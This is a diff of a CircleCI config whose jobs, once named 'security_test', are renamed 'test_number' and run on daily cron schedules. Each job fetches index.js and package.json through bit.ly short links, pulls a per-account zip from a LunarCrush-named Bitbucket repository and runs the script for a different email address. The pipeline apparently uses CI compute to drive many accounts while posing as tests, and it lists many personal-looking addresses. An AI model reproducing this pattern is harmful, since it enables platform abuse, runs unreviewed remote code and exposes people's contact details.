@@ -1,9 +1,9 @@
 version: 2.1
 
 jobs:
- security_test_17:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+ test_number_17:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/djibrilfelix52_outlook-com.zip -o lunarCrushData.zip
@@ -11,9 +11,9 @@ jobs:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: npm i -s
       - run: node index -t 58 -r 2 -e djibrilfelix52@outlook.com
- security_test_18:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+ test_number_18:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
@@ -21,19 +21,19 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index -t 58 -r 2 -e happy.nast@outlook.com
- security_test_19:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+ test_number_19:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/alliot.andre_outlook-com.zip -o lunarCrushData.zip
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index -t 58 -r 2 -e alliot.andre@outlook.com
- security_test_20:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+      - run: node index -t 57 -r 3 -e alliot.andre@outlook.com
+ test_number_20:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
@@ -41,9 +41,9 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index -t 58 -r 2 -e aminatazabuga@outlook.com
- security_test_21:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+ test_number_21:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
@@ -51,36 +51,36 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index -t 57 -r 3 -e barrfrankmoses1999@outlook.com
- security_test_22:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+ test_number_22:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/lieudieuphulaygiaxuong_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/dinhtienhiangfheu_vip-stu-office-gy.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: npm i -s
-      - run: node index -t 58 -r 2 -e lieudieuphulaygiaxuong@outlook.com
- security_test_23:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+      - run: node index -t 58 -r 2 -e dinhtienhiangfheu@vip.stu.office.gy
+ test_number_23:
+    machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/nguoimotnha_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/ghinhghidangtuan_vip-stu-office-gy.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index -t 58 -r 2 -e nguoimotnha@outlook.com
- security_test_24:
-    docker:
-      - image: cimg/node:16.13.0-browsers
+      - run: node index -t 58 -r 2 -e ghinhghidangtuan@vip.stu.office.gy
+ test_number_24:
+   machine:
+      image: ubuntu-2004:202101-01
     resource_class: small
     steps:
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/lananhnguyenthix_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/sieunhanasyk_vip-stu-office-gy.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index -t 58 -r 2 -e lananhnguyenthix@outlook.com
+      - run: node index -t 58 -r 2 -e sieunhanasyk@vip.stu.office.gy
       
       
 workflows:
@@ -89,13 +89,13 @@ workflows:
   security_test:
     triggers:
       - schedule:
-          cron: "6 0 * * *"
+          cron: "8 0 * * *"
           filters:
             branches:
               only:
                 - main
       - schedule:
-          cron: "10 1 * * *"
+          cron: "12 1 * * *"
           filters:
             branches:
               only:
